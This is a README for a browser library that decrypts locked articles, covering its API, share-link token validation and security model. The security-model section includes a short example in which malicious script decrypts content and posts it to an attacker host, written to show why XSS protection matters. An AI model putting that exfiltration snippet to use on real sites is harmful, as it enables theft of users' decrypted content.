# Capsule Client Library

Browser-side decryption library for the Capsule secure article-locking system.

## Features

- **Zero-Config Setup**: Keys auto-generated on first use, no manual initialization required
- **High-Level API**: Unlock content with a single function call, or go low-level for full control
- **HTML Processing**: Automatically finds encrypted elements, decrypts, and renders content
- **Script Execution**: Embedded `<script>` tags in decrypted content are executed (configurable)
- **Custom Events**: Listen for `capsule:unlock`, `capsule:error`, and `capsule:state` events
- **DEK Caching**: Encrypted DEKs cached in memory, sessionStorage, or IndexedDB
- **Auto-Renewal**: DEKs automatically renewed before expiry
- **Secure Key Storage**: RSA private keys stored with `extractable: false` in IndexedDB
- **Web Crypto API**: Uses native browser cryptography for maximum security

## Installation

```bash
npm install @sesamy/capsule
```

## Quick Start

### Minimal Setup

```typescript
import { CapsuleClient } from "@sesamy/capsule";

const capsule = new CapsuleClient({
  unlock: async ({ keyId, wrappedDek, publicKey, articleId }) => {
    const res = await fetch("/api/unlock", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ keyId, wrappedDek, publicKey }),
    });
    return res.json(); // { encryptedDek, expiresAt }
  },
});

// Unlock a specific article - keys are auto-created if needed!
const content = await capsule.unlockElement("article-123");
```

### Auto-Process All Encrypted Elements

```typescript
const capsule = new CapsuleClient({
  unlock: myUnlockFunction,
  autoProcess: true, // Automatically process elements on page load
});

// Listen for events
document.addEventListener("capsule:unlock", (e) => {
  console.log(
    "Unlocked:",
    e.detail.articleId,
    e.detail.content.substring(0, 100)
  );
});

document.addEventListener("capsule:error", (e) => {
  console.error("Failed to unlock:", e.detail.articleId, e.detail.error);
});
```

### HTML Markup

Add encrypted content to your page with the `data-capsule` attribute:

```html
<div
  data-capsule='{"articleId":"abc123","encryptedContent":"...","iv":"...","wrappedKeys":[...]}'
>
  <p>Loading encrypted content...</p>
</div>
```

When unlocked, the element's content is replaced with the decrypted HTML.

## Configuration Options

```typescript
interface CapsuleClientOptions {
  // Required for automatic unlocking
  unlock?: UnlockFunction; // Async function to fetch encrypted DEK from server

  // Key settings
  keySize?: 2048 | 4096; // RSA key size (default: 2048)

  // Processing behavior
  autoProcess?: boolean; // Auto-process elements on init (default: false)
  executeScripts?: boolean; // Execute <script> tags in decrypted content (default: true)
  selector?: string; // CSS selector for encrypted elements (default: '[data-capsule]')

  // DEK caching
  dekStorage?: "memory" | "session" | "persist"; // How to store DEKs (default: 'persist')
  renewBuffer?: number; // Ms before expiry to auto-renew (default: 5000)

  // Storage
  dbName?: string; // IndexedDB database name (default: 'capsule-keys')
  storeName?: string; // IndexedDB store name (default: 'keypair')

  // Debugging
  logger?: (message: string, level: "info" | "error" | "debug") => void;
}
```

## API Reference

### High-Level Methods

#### `getPublicKey(): Promise<string>`

Get the user's public key (Base64 SPKI format). **Creates a new key pair if none exists.**

```typescript
const publicKey = await capsule.getPublicKey();
// Send to server for key registration
```

#### `unlockElement(articleId: string): Promise<string>`

Find an encrypted element by article ID, decrypt it, and render the content.

```typescript
const content = await capsule.unlockElement("article-123");
```

#### `processAll(): Promise<Map<string, string | Error>>`

Process all encrypted elements on the page.

```typescript
const results = await capsule.processAll();
for (const [id, result] of results) {
  if (result instanceof Error) {
    console.error(`Failed: ${id}`, result);
  }
}
```

#### `unlock(article: EncryptedArticle, preferredKeyType?: 'tier' | 'article'): Promise<string>`

Decrypt an encrypted article, using cached DEK or fetching a new one.

```typescript
const article = JSON.parse(element.dataset.capsule);
const content = await capsule.unlock(article, "tier");
```

#### `unlockWithToken(article: EncryptedArticle, token: string): Promise<string>`

Decrypt content using a pre-signed share token. Use this for share links where the token is passed in the URL.

```typescript
// Get token from URL (e.g., ?token=eyJhbGc...)
const params = new URLSearchParams(window.location.search);
const token = params.get("token");

if (token) {
  const content = await capsule.unlockWithToken(article, token);
  console.log("Unlocked via share link!");
}
```

### Low-Level Methods

#### `decrypt(article: EncryptedArticle, encryptedDek: string): Promise<string>`

Decrypt content with a pre-fetched encrypted DEK. For full manual control.

```typescript
// Manual flow
const publicKey = await capsule.getPublicKey();
const { encryptedDek } = await myServerCall(publicKey, article.wrappedKeys[0]);
const content = await capsule.decrypt(article, encryptedDek);
```

#### `decryptPayload(payload: EncryptedPayload): Promise<string>`

Decrypt a simple single-key payload (no envelope encryption).

```typescript
const content = await capsule.decryptPayload({
  encryptedContent: "...",
  iv: "...",
  encryptedDek: "...",
});
```

### Utility Methods

#### `hasKeyPair(): Promise<boolean>`

Check if a key pair exists.

#### `getKeyInfo(): Promise<{ keySize: number; createdAt: number } | null>`

Get information about the stored key pair.

#### `regenerateKeyPair(): Promise<string>`

Generate a new key pair, replacing any existing one.

#### `clearAll(): Promise<void>`

Clear all stored keys and cached DEKs.

#### `getElementState(articleId: string): ElementState | undefined`

Get the current state of an encrypted element ('locked' | 'unlocking' | 'decrypting' | 'unlocked' | 'error').

## Events

The client emits custom events on elements and the document:

### `capsule:unlock`

Fired when content is successfully decrypted.

```typescript
document.addEventListener(
  "capsule:unlock",
  (e: CustomEvent<CapsuleUnlockEvent>) => {
    const { articleId, keyId, content, element } = e.detail;
  }
);
```

### `capsule:error`

Fired when decryption fails.

```typescript
document.addEventListener(
  "capsule:error",
  (e: CustomEvent<CapsuleErrorEvent>) => {
    const { articleId, error, element } = e.detail;
  }
);
```

### `capsule:state`

Fired when element state changes.

```typescript
document.addEventListener(
  "capsule:state",
  (e: CustomEvent<CapsuleStateEvent>) => {
    const { articleId, previousState, state, element } = e.detail;
    // state: 'locked' | 'unlocking' | 'decrypting' | 'unlocked' | 'error'
  }
);
```

## Unlock Function

The `unlock` function is called when content needs to be decrypted but no cached DEK is available:

```typescript
type UnlockFunction = (params: {
  keyId: string; // Key ID from wrappedKeys (e.g., "premium:bucket123")
  wrappedDek: string; // CMK-encrypted DEK from the article
  publicKey: string; // User's public key (Base64 SPKI)
  articleId: string; // Article being unlocked
}) => Promise<{
  encryptedDek: string; // DEK encrypted with user's public key
  expiresAt: string | number; // When the DEK expires
  bucketId?: string; // Optional bucket ID for time-based keys
  bucketPeriodSeconds?: number;
}>;
```

Example implementation:

```typescript
const unlock: UnlockFunction = async ({ keyId, wrappedDek, publicKey }) => {
  const response = await fetch("/api/unlock", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${getAuthToken()}`,
    },
    body: JSON.stringify({ keyId, wrappedDek, publicKey }),
  });

  if (!response.ok) {
    throw new Error("Unauthorized or payment required");
  }

  return response.json();
};
```

## Share Link Unlock

Capsule supports pre-signed share tokens for unlocking content without user authentication. This enables sharing articles on social media, via email, or as "gift article" links.

### How It Works

1. **Publisher generates a token** on the server (see `@sesamy/capsule-server`)
2. **Share URL is created**: `https://example.com/article/xyz?token=eyJhbGc...`
3. **Reader clicks link** - no login required
4. **Client detects token** and calls `unlockWithToken()`
5. **Server validates token** and returns DEK wrapped for the client
6. **Content is decrypted** just like a normal unlock

### Implementation

```typescript
import { CapsuleClient } from "@sesamy/capsule";

// Create client with token-aware unlock function
const capsule = new CapsuleClient({
  unlock: async ({ keyId, wrappedDek, publicKey, token, articleId }) => {
    // Token is automatically passed if using unlockWithToken()
    const response = await fetch("/api/unlock", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        token,        // Pre-signed share token (if present)
        wrappedDek,
        publicKey,
        articleId,
        keyId,        // Fallback for non-token unlock
      }),
    });
    return response.json();
  },
});

// Check for token in URL and auto-unlock
async function initPage() {
  const article = JSON.parse(
    document.querySelector("[data-capsule]")?.dataset.capsule ?? "{}"
  );
  
  const params = new URLSearchParams(window.location.search);
  const token = params.get("token");

  if (token && article.articleId) {
    try {
      const content = await capsule.unlockWithToken(article, token);
      renderContent(content);
      
      // Optional: remove token from URL for cleaner sharing
      const url = new URL(window.location.href);
      url.searchParams.delete("token");
      history.replaceState({}, "", url);
    } catch (err) {
      console.error("Share link unlock failed:", err);
      // Fall back to normal unlock flow or show paywall
    }
  }
}
```

### Token Properties

Tokens can include:

| Property | Description |
|----------|-------------|
| `tier` | Required. Which tier this grants access to |
| `expiresIn` | Required. Token validity: "1h", "24h", "7d", "30d" |
| `articleId` | Optional. Restrict to specific article |
| `maxUses` | Optional. Limit total uses across all readers |
| `userId` | Optional. Track which user/publisher created the link |

### Server-Side Token Handling

See [@sesamy/capsule-server](https://github.com/user/capsule/tree/main/packages/capsule-server#share-links--pre-signed-tokens) for:
- Token generation with `createTokenManager()`
- Token validation in your unlock endpoint
- The `unlockWithToken()` server method

## Share Link Token Validation

The client library includes utilities for parsing and validating share link tokens. This enables:
- **Quick token inspection** without server round-trips
- **Client-side expiry checks** before making network requests
- **Content routing** based on token's `contentId` or `url`
- **Full signature verification** with trusted keys

### Token Structure

Share tokens contain:

| Field | Type | Description |
|-------|------|-------------|
| `iss` | string | Issuer identifier (who created the token) |
| `kid` | string | Key ID (which signing key was used) |
| `tier` | string | Access tier granted |
| `contentId` | string | Publisher's content ID |
| `url` | string? | Optional full URL for the content |
| `exp` | number | Expiration timestamp (Unix seconds) |
| `iat` | number | Issued-at timestamp |
| `tid` | string | Unique token ID for tracking |
| `userId` | string? | Optional creator ID |
| `maxUses` | number? | Optional usage limit |
| `meta` | object? | Optional custom metadata |

### Basic Token Parsing

Parse tokens without signature validation (for routing/display):

```typescript
import { parseShareToken, getShareTokenFromUrl } from '@sesamy/capsule';

// Parse a token string
const result = parseShareToken(token);

if (result.valid) {
  console.log(`Issuer: ${result.payload.iss}`);
  console.log(`Content: ${result.payload.contentId}`);
  console.log(`Expires in: ${result.expiresIn}s`);
  console.log(`Expired: ${result.expired}`);
} else {
  console.error(`Parse error: ${result.error}`);
}

// Or extract from current URL automatically
const urlToken = getShareTokenFromUrl();
if (urlToken?.valid && !urlToken.expired) {
  // Redirect to correct content if needed
  if (urlToken.payload.contentId !== currentArticleId) {
    window.location.href = urlToken.payload.url || `/article/${urlToken.payload.contentId}`;
  }
}
```

### Content Validation

Check that a token is for the expected content:

```typescript
import { parseShareToken, validateTokenForContent } from '@sesamy/capsule';

const result = parseShareToken(token);
if (result.valid) {
  const validation = validateTokenForContent(result, 'my-article-id');
  if (!validation.valid) {
    console.error(validation.reason);
    // "Token is for content 'other-article', not 'my-article-id'"
  }
}
```

### Full Signature Validation (TokenValidator)

For trusted first-party tokens, validate signatures client-side:

```typescript
import { TokenValidator, createTokenValidator } from '@sesamy/capsule';

// Option 1: Whitelist trusted publishers
const validator = new TokenValidator({
  trustedKeys: {
    'my-publisher:key-2026-01': 'shared-secret-here',
    'partner-site:key-v1': 'partner-secret',
  },
  requireTrustedIssuer: true, // Reject unknown issuers
});

const result = await validator.validate(token);

if (result.valid) {
  console.log(`Signature verified!`);
  console.log(`Trusted issuer: ${result.trusted}`);
  console.log(`Issuer: ${result.payload.iss}`);
  console.log(`Key ID: ${result.payload.kid}`);
  console.log(`Expired: ${result.expired}`);
} else {
  console.error(`Validation failed: ${result.error}`);
  // Possible errors: 'invalid_signature', 'untrusted_issuer', 'expired', 'malformed'
}
```

### Accepting Any Token

For open validation without a whitelist:

```typescript
// Accept any token with a provided secret
const validator = new TokenValidator();

const result = await validator.validate(token, {
  secret: mySecret,                    // Required when not using trusted keys
  contentId: 'expected-article-id',    // Optional: validate content binding
});
```

### Runtime Key Management

Add or remove trusted keys dynamically:

```typescript
const validator = new TokenValidator({
  trustedKeys: { 'issuer-a:key-1': 'secret-a' }
});

// Check trust status
validator.isTrusted('issuer-a', 'key-1');  // true
validator.isTrusted('issuer-b', 'key-1');  // false

// Add new trusted key
validator.addTrustedKey('issuer-b', 'key-1', 'secret-b');

// Remove trusted key
validator.removeTrustedKey('issuer-a', 'key-1');
```

### Validate from URL

Convenience method to extract and validate token from current URL:

```typescript
const result = await validator.validateFromUrl();

if (result?.valid && !result.expired) {
  // Token from ?token=... is valid
  console.log(`Valid token for ${result.payload.contentId}`);
  await capsule.unlockWithToken(article, result.token);
}
```

### Complete Share Link Flow

```typescript
import { CapsuleClient, TokenValidator, getShareTokenFromUrl } from '@sesamy/capsule';

const validator = new TokenValidator({
  trustedKeys: {
    'my-site:key-2026': process.env.NEXT_PUBLIC_TOKEN_SECRET,
  },
});

const capsule = new CapsuleClient({
  unlock: async (params) => {
    const res = await fetch('/api/unlock', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params),
    });
    return res.json();
  },
});

async function handleShareLink() {
  const tokenInfo = getShareTokenFromUrl();
  if (!tokenInfo?.valid) return;

  // Validate signature
  const validation = await validator.validateFromUrl();
  if (!validation?.valid) {
    showError('Invalid or expired share link');
    return;
  }

  if (validation.expired) {
    showError('This share link has expired');
    return;
  }

  // Unlock content
  const article = getArticleData(validation.payload.contentId);
  const content = await capsule.unlockWithToken(article, tokenInfo.token);
  renderContent(content);
  
  // Clean URL
  const url = new URL(window.location.href);
  url.searchParams.delete('token');
  history.replaceState({}, '', url);
}
```

### Validation Result Types

```typescript
interface TokenValidationSuccess {
  valid: true;
  trusted: boolean;      // Is issuer in trustedKeys?
  expired: boolean;      // Has token expired?
  expiresIn: number;     // Seconds until expiry (negative if expired)
  payload: ShareTokenPayload;
}

interface TokenValidationFailure {
  valid: false;
  error: 'malformed' | 'invalid_format' | 'invalid_signature' 
       | 'untrusted_issuer' | 'no_secret' | 'expired';
  message: string;
  payload?: ShareTokenPayload;  // Available for debugging
}
```

## JWKS-Based Token Validation (Ed25519)

For asymmetric key signing with automatic public key discovery, use the `JwksTokenValidator`. This approach:

- Uses **Ed25519 asymmetric signing** instead of shared secrets
- Fetches public keys from the issuer's `/.well-known/jwks.json` endpoint
- Requires only the issuer URL, not the actual secret
- Enables cross-domain token validation without shared secrets

### Server-Side Setup

On the server, use `AsymmetricTokenManager` to generate Ed25519-signed tokens:

```typescript
import { 
  AsymmetricTokenManager, 
  generateSigningKeyPair 
} from '@sesamy/capsule-server';

// Generate or load a key pair
const keyPair = await generateSigningKeyPair();

const tokenManager = new AsymmetricTokenManager({
  issuer: 'https://api.example.com',
  keyId: 'key-2025-01',
  keyPair,
});

// Generate a share token
const token = await tokenManager.generate({
  tier: 'premium',
  contentId: 'article-123',
  expiresIn: '7d',
});

// Expose JWKS at /.well-known/jwks.json
// GET /.well-known/jwks.json
export async function GET() {
  return Response.json(tokenManager.getJwks());
}
```

### Client-Side Validation

Use `JwksTokenValidator` to validate tokens from trusted issuers:

```typescript
import { JwksTokenValidator, createJwksTokenValidator } from '@sesamy/capsule';

// Whitelist trusted issuers by URL
const validator = new JwksTokenValidator({
  trustedIssuers: [
    'https://api.example.com',
    'https://partner.example.org',
  ],
});

// Validate a token
const result = await validator.validate(token);

if (result.valid && !result.expired) {
  console.log(`Verified token from ${result.issuer}`);
  console.log(`Key ID: ${result.keyId}`);
  console.log(`Content: ${result.payload.contentId}`);
}
```

### How JWKS Discovery Works

1. **Token contains `iss` (issuer):** The token payload includes an `iss` field like `https://api.example.com`
2. **Whitelist check:** The client verifies the issuer is in `trustedIssuers` before fetching
3. **Fetch JWKS:** The client fetches `{issuer}/.well-known/jwks.json`
4. **Find matching key:** Uses the token's `kid` (key ID) to find the correct public key
5. **Verify signature:** Validates the Ed25519 signature using the public key

```typescript
// The JWKS endpoint returns:
{
  "keys": [{
    "kty": "OKP",
    "crv": "Ed25519",
    "kid": "key-2025-01",
    "x": "base64url-encoded-public-key",
    "use": "sig",
    "alg": "EdDSA"
  }]
}
```

### Issuer Management

Manage trusted issuers at runtime:

```typescript
const validator = new JwksTokenValidator({
  trustedIssuers: ['https://api.example.com'],
});

// Check if an issuer is trusted
validator.isTrustedIssuer('https://api.example.com');  // true
validator.isTrustedIssuer('https://evil.com');         // false

// Add new trusted issuer
validator.addTrustedIssuer('https://partner.example.org');

// Remove trusted issuer (also clears cached keys)
validator.removeTrustedIssuer('https://old.example.com');
```

### JWKS Caching

The validator caches JWKS responses to avoid repeated fetches:

```typescript
const validator = new JwksTokenValidator({
  trustedIssuers: ['https://api.example.com'],
  cacheTimeMs: 60 * 60 * 1000,  // 1 hour (default)
});

// First validation: fetches JWKS
await validator.validate(token1);

// Second validation: uses cached keys
await validator.validate(token2);

// Force refresh by clearing cache
validator.clearCache('https://api.example.com');
// Or clear all cached issuers
validator.clearCache();
```

### Signing Key Rotation

Token signing keys are **separate from time bucket keys**:

| Key Type | Purpose | Rotation |
|----------|---------|----------|
| Time bucket keys | Wrap content DEKs | Every 15 minutes |
| Token signing keys | Sign share link tokens | Infrequently (months/years) |

Signing keys must be long-lived because share links may be valid for 30+ days.
For key rotation, add the new key to JWKS first, then start using it:

```typescript
// JWKS can contain multiple keys for rotation
{
  "keys": [
    { "kid": "key-2026-01", ... },  // Current signing key
    { "kid": "key-2025-01", ... },  // Previous key (still validating old tokens)
  ]
}
```

Keep old keys in JWKS until all tokens signed with them have expired.

### Content ID Validation

Optionally validate that the token is for specific content:

```typescript
const result = await validator.validate(token, {
  contentId: 'expected-article-id',
});

if (!result.valid && result.error === 'malformed') {
  console.error(result.message);
  // "Token is for content 'other-article', not 'expected-article-id'"
}
```

### Validate from URL

Convenience method to validate token from current URL:

```typescript
const result = await validator.validateFromUrl({
  contentId: currentArticleId,
});

if (result?.valid && !result.expired) {
  console.log(`Valid token: ${result.token}`);
  await capsule.unlockWithToken(article, result.token);
}
```

### Complete JWKS Share Link Flow

```typescript
import { 
  CapsuleClient, 
  JwksTokenValidator,
  getShareTokenFromUrl 
} from '@sesamy/capsule';

// Create JWKS validator with trusted issuers
const validator = new JwksTokenValidator({
  trustedIssuers: [
    'https://api.yoursite.com',
    'https://api.partner.com',
  ],
});

const capsule = new CapsuleClient({
  unlock: async (params) => {
    const res = await fetch('/api/unlock', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params),
    });
    return res.json();
  },
});

async function handleShareLink() {
  // Quick check for token in URL
  const tokenInfo = getShareTokenFromUrl();
  if (!tokenInfo?.valid) return;

  // Full signature validation via JWKS
  const validation = await validator.validateFromUrl();
  if (!validation?.valid) {
    showError(`Invalid share link: ${validation.message}`);
    return;
  }

  if (validation.expired) {
    showError('This share link has expired');
    return;
  }

  // Unlock content
  const article = getArticleData(validation.payload.contentId);
  const content = await capsule.unlockWithToken(article, tokenInfo.token);
  renderContent(content);

  // Clean URL
  const url = new URL(window.location.href);
  url.searchParams.delete('token');
  history.replaceState({}, '', url);
}
```

### JWKS Validation Result Types

```typescript
interface JwksValidationSuccess {
  valid: true;
  issuer: string;        // Verified issuer URL
  keyId: string;         // Key ID used to sign
  expired: boolean;      // Has token expired?
  expiresIn: number;     // Seconds until expiry
  payload: ShareTokenPayload;
}

interface JwksValidationFailure {
  valid: false;
  error: 'malformed' | 'invalid_format' | 'invalid_signature' 
       | 'untrusted_issuer' | 'unknown_key' | 'jwks_fetch_failed'
       | 'unsupported_algorithm';
  message: string;
  payload?: ShareTokenPayload;
}
```

### Choosing Between HMAC and JWKS

| Feature | TokenValidator (HMAC) | JwksTokenValidator (Ed25519) |
|---------|----------------------|------------------------------|
| **Signing** | Symmetric (shared secret) | Asymmetric (public/private key) |
| **Secret sharing** | Client needs secret | Client only needs issuer URL |
| **Key discovery** | Manual key configuration | Automatic via JWKS endpoint |
| **Cross-domain** | Requires secret sharing | Works without sharing secrets |
| **Best for** | First-party tokens | Third-party/partner tokens |

## DEK Storage Modes

Control how decrypted DEKs are cached:

| Mode        | Storage           | Persistence              | Use Case             |
| ----------- | ----------------- | ------------------------ | -------------------- |
| `'memory'`  | JavaScript memory | Lost on page refresh     | Maximum security     |
| `'session'` | sessionStorage    | Lost when tab closes     | Balance security/UX  |
| `'persist'` | IndexedDB         | Survives browser restart | Best offline support |

Note: DEKs are stored **encrypted** with the user's public key. They must be unwrapped using the private key (which never leaves the browser's secure crypto subsystem).

## Security Model

### Private Key Protection: The Core Security Guarantee

The Capsule client's security is built on a fundamental principle: **the private key cannot be extracted from the browser**, even by the user themselves or malicious JavaScript code.

#### How Non-Extractable Keys Work

When generating a key pair, the private key is stored with `extractable: false`:

```typescript
const privateKey = await crypto.subtle.importKey(
  "jwk",
  privateKeyJwk,
  { name: "RSA-OAEP", hash: "SHA-256" },
  false, // NOT extractable - this is enforced at the browser engine level
  ["unwrapKey"]
);
```

This means:

- ✅ **The key can be used** for cryptographic operations (unwrapping DEKs)
- ❌ **The key cannot be exported** in any format (JWK, PKCS8, raw bytes)
- ❌ **The key cannot be copied** to another device or browser
- ❌ **The key cannot be downloaded** or sent to a server

#### What About IndexedDB Access?

Users and JavaScript code **can access IndexedDB** through DevTools or browser APIs:

```javascript
// This works - you can retrieve the key object
const db = await indexedDB.open("capsule-keys");
const keyPair = await db.get("keypair", "default");
console.log(keyPair.privateKey);
// Output: CryptoKey {type: "private", extractable: false, ...}

// But this FAILS - you cannot export the key material
await crypto.subtle.exportKey("jwk", keyPair.privateKey);
// Error: "key is not extractable"
```

The `CryptoKey` object stored in IndexedDB is just a **handle** or **reference** to the actual key material, which lives in the browser's secure crypto subsystem. Think of it like a key to a safe deposit box that only works inside the bank - you can use it there, but you can't take the contents home.

#### Attack Vector Analysis

| Attack Type                   | Can Extract Private Key? | Notes                                            |
| ----------------------------- | ------------------------ | ------------------------------------------------ |
| Server compromise             | ❌ No                    | Key never sent to server                         |
| Network interception          | ❌ No                    | Key never transmitted                            |
| XSS/malicious JavaScript      | ❌ No                    | Can _use_ key, but cannot _export_ it            |
| Browser DevTools access       | ❌ No                    | Can see key object, but not key bytes            |
| Database breach               | ❌ No                    | No server-side key storage                       |
| User attempting manual export | ❌ No                    | `extractable: false` prevents all export methods |

The **only** attack that works is using the key for its intended purpose:

```javascript
// Malicious code CAN do this:
const decryptedContent = await client.decryptArticle(payload);
await fetch("https://attacker.com", {
  method: "POST",
  body: decryptedContent, // Send decrypted content (not the key!)
});
```

This is why **XSS protection** (Content Security Policy, input sanitization) remains critical - not to protect the key itself, but to prevent unauthorized **use** of the key.

### Public vs Private Key: Why Different Extractability?

The key pair has different extractability settings for important reasons:

- **Public Key**: `extractable: true`
  - Must be exported to SPKI format and sent to the server
  - Safe to share - it can only _encrypt_, not _decrypt_
  - Server uses it to wrap DEKs before sending to client
- **Private Key**: `extractable: false`
  - Must stay locked in the browser's crypto engine
  - Can only be used for unwrapping DEKs, never exported
  - Guarantees end-to-end encryption - server never has decrypt capability

### Additional Security Layers

1. **DEKs in Memory Only**: Unwrapped DEKs are cached in JavaScript memory (not persisted) and lost on page refresh
2. **AES-GCM Authentication**: 128-bit auth tags prevent tampering with encrypted content
3. **Web Crypto API**: Uses hardware-accelerated cryptography when available (TPM, Secure Enclave)
4. **Secure Context Requirement**: Web Crypto API only works over HTTPS or localhost
5. **Origin Isolation**: IndexedDB is bound to the origin - other websites cannot access your keys

### What This Means for Your Application

✅ **Server compromise cannot leak user keys** - They're not on the server  
✅ **Database breach cannot decrypt content** - Private keys are client-side only  
✅ **Network eavesdropping is ineffective** - Only wrapped DEKs are transmitted  
✅ **Users cannot accidentally export their keys** - Browser prevents it  
✅ **True end-to-end encryption** - Only the user's browser can decrypt

### Limitations and Trade-offs

⚠️ **Key loss means data loss**: If a user clears browser data or switches devices, they lose access  
⚠️ **No cross-device sync**: Keys are tied to a single browser profile  
⚠️ **XSS can still abuse keys**: Malicious code can decrypt content (though not steal keys)

Consider implementing:

- Server-side encrypted key backup (wrapped with user password)
- Multi-device key synchronization (using secure key exchange protocols)
- Content Security Policy (CSP) to prevent XSS attacks

## Browser Compatibility

Requires browsers with Web Crypto API support:

- Chrome 37+
- Firefox 34+
- Safari 11+
- Edge 12+

## Development

```bash
npm install
npm run build
npm test
```

## License

MIT
